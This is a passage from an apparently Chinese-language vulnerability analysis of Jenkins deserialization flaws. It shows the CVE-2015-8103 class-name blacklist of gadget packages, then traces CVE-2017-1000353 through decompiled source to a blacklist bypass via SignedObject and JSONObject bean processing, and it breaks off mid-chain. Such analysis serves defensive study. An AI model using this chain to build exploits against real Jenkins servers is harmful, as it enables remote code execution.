<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> desc.getName();<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.filter.check(Class.forName(<span class="hljs-built_in">this</span>.filter.check(name), <span class="hljs-literal">false</span>, <span class="hljs-built_in">this</span>.cl));<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var4) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>简单来说就是一个正则一样的黑名单，其值如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] DEFAULT_PATTERNS = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<br>    <span class="hljs-string">&quot;^bsh[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^com[.]google[.]inject[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^com[.]mchange[.]v2[.]c3p0[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^com[.]sun[.]jndi[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^com[.]sun[.]corba[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^com[.]sun[.]javafx[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^com[.]sun[.]org[.]apache[.]regex[.]internal[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^java[.]awt[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^java[.]rmi[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^javax[.]management[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^javax[.]naming[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^javax[.]script[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^javax[.]swing[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^org[.]apache[.]commons[.]beanutils[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^org[.]apache[.]commons[.]collections[.]functors[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^org[.]apache[.]myfaces[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^org[.]apache[.]wicket[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;.*org[.]apache[.]xalan.*&quot;</span>, <br>    <span class="hljs-string">&quot;^org[.]codehaus[.]groovy[.]runtime[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^org[.]hibernate[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^org[.]python[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^org[.]springframework[.](?!(\\p&#123;Alnum&#125;+[.])*\\p&#123;Alnum&#125;*Exception$).*&quot;</span>, <br>    <span class="hljs-string">&quot;^sun[.]rmi[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^javax[.]imageio[.].*&quot;</span>, <br>    <span class="hljs-string">&quot;^java[.]util[.]ServiceLoader$&quot;</span>, <br>    <span class="hljs-string">&quot;^java[.]net[.]URLClassLoader$&quot;</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<h3 id="CVE-2017-1000353"><a href="#CVE-2017-1000353" class="headerlink" title="CVE-2017-1000353"></a>CVE-2017-1000353</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull jenkins:2.46.1<br></code></pre></td></tr></table></figure>

<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p><a href="https://ssd-disclosure.com/ssd-advisory-cloudbees-jenkins-unauthenticated-code-execution/">参考文章</a>中给出了 payload，该漏洞与 CVE-2015-8103 类似，这次是从 HTTP 访问 cli 触发的漏洞，处理代码在 CLIAction$CliEndpointResponse 类的 generateResponse 函数中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">generateResponse</span><span class="hljs-params">(StaplerRequest req, StaplerResponse rsp, Object node)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">UUID</span> <span class="hljs-variable">uuid</span> <span class="hljs-operator">=</span> UUID.fromString(req.getHeader(<span class="hljs-string">&quot;Session&quot;</span>));<br>        rsp.setHeader(<span class="hljs-string">&quot;Hudson-Duplex&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-keyword">if</span> (req.getHeader(<span class="hljs-string">&quot;Side&quot;</span>).equals(<span class="hljs-string">&quot;download&quot;</span>)) &#123;<br>            FullDuplexHttpChannel server;<br>            CLIAction.<span class="hljs-built_in">this</span>.duplexChannels.put(uuid, server = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FullDuplexHttpChannel</span>(uuid, !Jenkins.getActiveInstance().hasPermission(Jenkins.ADMINISTER)) &#123;<br>                <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(Channel channel)</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException &#123;<br>                    channel.setProperty(CLICommand.TRANSPORT_AUTHENTICATION, Jenkins.getAuthentication());<br>                    channel.setProperty(CliEntryPoint.class.getName(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">CliManagerImpl</span>(channel));<br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                server.download(req, rsp);<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                CLIAction.<span class="hljs-built_in">this</span>.duplexChannels.remove(uuid);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            ((FullDuplexHttpChannel)CLIAction.<span class="hljs-built_in">this</span>.duplexChannels.get(uuid)).upload(req, rsp);<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">catch</span> (InterruptedException var10) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(var10);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到，Jenkins 通过一个头 Session 决定一个通信频道，然后根据另一个头 Side 的不同，在同一个频道中会有 upload 和 download 两种处理方式，download 的处理会调用 download 函数，其中一部分代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span>(<span class="hljs-built_in">this</span>.upload == <span class="hljs-literal">null</span> &amp;&amp; System.currentTimeMillis() &lt; end) &#123;<br>    <span class="hljs-built_in">this</span>.wait(<span class="hljs-number">1000L</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.upload == <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;HTTP full-duplex channel timeout: &quot;</span> + <span class="hljs-built_in">this</span>.uuid);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到，download 会挂起等待一段时间，直到 upload 属性被赋值才会进行下一步操作。回去看看 upload 的处理：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">upload</span><span class="hljs-params">(StaplerRequest req, StaplerResponse rsp)</span> <span class="hljs-keyword">throws</span> InterruptedException, IOException &#123;<br>    rsp.setStatus(<span class="hljs-number">200</span>);<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> req.getInputStream();<br>    <span class="hljs-keyword">if</span> (DIY_CHUNKING) &#123;<br>        in = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChunkedInputStream</span>((InputStream)in);<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.upload = (InputStream)in;<br>    <span class="hljs-built_in">this</span>.notify();<br><br>    <span class="hljs-keyword">while</span>(!<span class="hljs-built_in">this</span>.completed) &#123;<br>        <span class="hljs-built_in">this</span>.wait();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>从 upload 中读取输入流，然后放入 upload 属性中。upload 结束后再回到 download：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-built_in">this</span>.channel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Channel</span>(<span class="hljs-string">&quot;HTTP full-duplex channel &quot;</span> + <span class="hljs-built_in">this</span>.uuid, Computer.threadPoolForRemoting, Mode.BINARY, <span class="hljs-built_in">this</span>.upload, (OutputStream)out, (OutputStream)<span class="hljs-literal">null</span>, <span class="hljs-built_in">this</span>.restricted);<br>    ...<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    <span class="hljs-built_in">this</span>.completed = <span class="hljs-literal">true</span>;<br>    <span class="hljs-built_in">this</span>.notify();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>实例化了一个 Channel 类，其构造函数是一个套娃过程，其中一步如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Channel(ChannelBuilder settings, InputStream is, OutputStream os) <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-built_in">this</span>(settings, settings.negotiate(is, os));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>negotiate 函数就是 CVE-2015-8103 的反序列化触发点，不过那个触发点已经被修复了，这次走的是另一条路，现版本的 switch 代码块如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">switch</span>(i) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        LOGGER.log(Level.FINER, <span class="hljs-string">&quot;Received mode preamble: &#123;0&#125;&quot;</span>, modes[i]);<br>        <span class="hljs-keyword">if</span> (mode == Mode.NEGOTIATE) &#123;<br>            mode = modes[i];<br>            LOGGER.log(Level.FINER, <span class="hljs-string">&quot;Sending agreed mode preamble: &#123;0&#125;&quot;</span>, mode);<br>            os.write(mode.preamble);<br>            os.flush();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (modes[i] != mode) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Protocol negotiation failure&quot;</span>);<br>        &#125;<br><br>        LOGGER.log(Level.FINE, <span class="hljs-string">&quot;Channel name &#123;0&#125; negotiated mode &#123;1&#125; with capability &#123;2&#125;&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-built_in">this</span>.name, mode, cap&#125;);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.makeTransport(is, os, mode, cap);<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        cap = Capability.read(is);<br>        LOGGER.log(Level.FINER, <span class="hljs-string">&quot;Received capability preamble: &#123;0&#125;&quot;</span>, cap);<br>        ptr[i] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">&quot;Unexpected preamble byte #&quot;</span> + i + <span class="hljs-string">&quot;. Only &quot;</span> + preambles.length + <span class="hljs-string">&quot; bytes are supported&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到，当 i 为 0、1 时，返回值来自 makeTransport 函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> CommandTransport <span class="hljs-title function_">makeTransport</span><span class="hljs-params">(InputStream is, OutputStream os, Mode mode, Capability cap)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">FlightRecorderInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FlightRecorderInputStream</span>(is);<br>    <span class="hljs-keyword">if</span> (cap.supportsChunking()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChunkedCommandTransport</span>(cap, mode.wrap(fis), mode.wrap(os), os);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(mode.wrap(os));<br>        oos.flush();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassicCommandTransport</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStreamEx</span>(mode.wrap(fis), <span class="hljs-built_in">this</span>.getBaseLoader(), <span class="hljs-built_in">this</span>.getClassFilter()), oos, fis, os, cap);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>因为此处的 cap 可以由 Capability.read 反序列化而成，所以这里简单来说就是一个 ClassicCommandTransport 对象，回到 Channel 的构造函数中，最后一步如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-title function_">Channel</span><span class="hljs-params">(ChannelBuilder settings, CommandTransport transport)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    ...<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.internalExport(IChannel.class, <span class="hljs-built_in">this</span>, <span class="hljs-literal">false</span>) != <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        ...<br>        transport.setup(<span class="hljs-built_in">this</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommandReceiver</span>() &#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(Command cmd)</span> &#123;<br>                Channel.<span class="hljs-built_in">this</span>.commandsReceived++;<br>                Channel.<span class="hljs-built_in">this</span>.lastCommandReceivedAt = System.currentTimeMillis();<br>                <span class="hljs-keyword">if</span> (Channel.logger.isLoggable(Level.FINE)) &#123;<br>                    Channel.logger.fine(<span class="hljs-string">&quot;Received &quot;</span> + cmd);<br>                &#125;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    cmd.execute(Channel.<span class="hljs-built_in">this</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (Throwable var3) &#123;<br>                    Channel.logger.log(Level.SEVERE, <span class="hljs-string">&quot;Failed to execute command &quot;</span> + cmd + <span class="hljs-string">&quot; (channel &quot;</span> + Channel.<span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot;)&quot;</span>, var3);<br>                    Channel.logger.log(Level.SEVERE, <span class="hljs-string">&quot;This command is created here&quot;</span>, cmd.createdAt);<br>                &#125;<br><br>            &#125;<br><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">terminate</span><span class="hljs-params">(IOException e)</span> &#123;<br>                Channel.<span class="hljs-built_in">this</span>.terminate(e);<br>            &#125;<br>        &#125;);<br>        ACTIVE_CHANNELS.put(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>.ref());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>transport 即上面的 ClassicCommandTransport 对象，下一步调用其 setup 函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setup</span><span class="hljs-params">(Channel channel, CommandReceiver receiver)</span> &#123;<br>    <span class="hljs-built_in">this</span>.channel = channel;<br>    (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SynchronousCommandTransport</span>.ReaderThread(receiver)).start();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ReaderThread 类的 run 函数一部分如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">cmd = SynchronousCommandTransport.<span class="hljs-built_in">this</span>.read();<br></code></pre></td></tr></table></figure>

<p>调用的 read 来自 ClassicCommandTransport 类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Command <span class="hljs-title function_">read</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Command</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> Command.readFrom(<span class="hljs-built_in">this</span>.channel, <span class="hljs-built_in">this</span>.ois);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.rawIn != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.rawIn.clear();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125; <br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>最后来到 Command.readFrom：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> Command <span class="hljs-title function_">readFrom</span><span class="hljs-params">(Channel channel, ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">Channel</span> <span class="hljs-variable">old</span> <span class="hljs-operator">=</span> Channel.setCurrent(channel);<br><br>    Command var3;<br>    <span class="hljs-keyword">try</span> &#123;<br>        var3 = (Command)ois.readObject();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        Channel.setCurrent(old);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> var3;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到另一个没有那么严格限制的反序列化点，不过这里的 ois 来自前面实例化 ClassicCommandTransport 对象时传入的 ObjectInputStreamEx 对象，也就是说这个反序列化点存在 CVE-2015-8103 的修复方式中提到的黑名单校验。所以要通过这个反序列化点进行反序列化攻击，还需要想点别的办法，比如某个可序列化类中会自己实例化一个 ObjectInputStream 然后输入一些可控字符 再 readObject 一下。</p>
<p>而 JDK 中正好有一个类 SignedObject，其 getObject 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    <span class="hljs-comment">// creating a stream pipe-line, from b to a</span><br>    <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(<span class="hljs-built_in">this</span>.content);<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(b);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> a.readObject();<br>    b.close();<br>    a.close();<br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>问题在于这个类没有继承什么接口，也没有调用其 getObject 函数的地方，所以要连接成反序列化链就需要找到一个反射操作的地方。</p>
<p>光 JDK 内部是没有这种类的，不过 Jenkins 内有个 JSONObject 类，其 defaultBeanProcessing 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title function_">defaultBeanProcessing</span><span class="hljs-params">(Object bean, JsonConfig jsonConfig)</span> &#123;<br>    ...<br><br>    PropertyDescriptor[] pds = PropertyUtils.getPropertyDescriptors(bean);<br>    <span class="hljs-type">PropertyFilter</span> <span class="hljs-variable">jsonPropertyFilter</span> <span class="hljs-operator">=</span> jsonConfig.getJsonPropertyFilter();<br><br>    String key;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; pds.length; ++i) &#123;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">bypass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> pds[i].getName();<br>        <span class="hljs-keyword">if</span> (!exclusions.contains(key) &amp;&amp; (!jsonConfig.isIgnoreTransientFields() || !isTransientField(key, beanClass, jsonConfig))) &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> pds[i].getPropertyType();<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                pds[i].getReadMethod();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var17) &#123;<br>                ...<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (pds[i].getReadMethod() != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!isTransient(pds[i].getReadMethod(), jsonConfig)) &#123;<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(bean, key);<br>                    ...<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到，这里会调用 getPropertyDescriptors 获取某个类中的属性描述符，经过测试可以发现，除了类中定义好的属性，getXXX 函数也会被 getPropertyDescriptors 函数认为是一个属性，所以可以通过 defaultBeanProcessing 函数调用 getObject。</p>
<p>继续往上，_fromBean：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title function_">_fromBean</span><span class="hljs-params">(Object bean, JsonConfig jsonConfig)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!addInstance(bean)) &#123;<br>        ...<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        fireObjectStartEvent(jsonConfig);<br>        <span class="hljs-type">JsonBeanProcessor</span> <span class="hljs-variable">processor</span> <span class="hljs-operator">=</span> jsonConfig.findJsonBeanProcessor(bean.getClass());<br>        JSONObject json;<br>        <span class="hljs-keyword">if</span> (processor != <span class="hljs-literal">null</span>) &#123;<br>            ...<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            json = defaultBeanProcessing(bean, jsonConfig);<br>            removeInstance(bean);<br>            fireObjectEndEvent(jsonConfig);<br>            <span class="hljs-keyword">return</span> json;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>继续：</p>
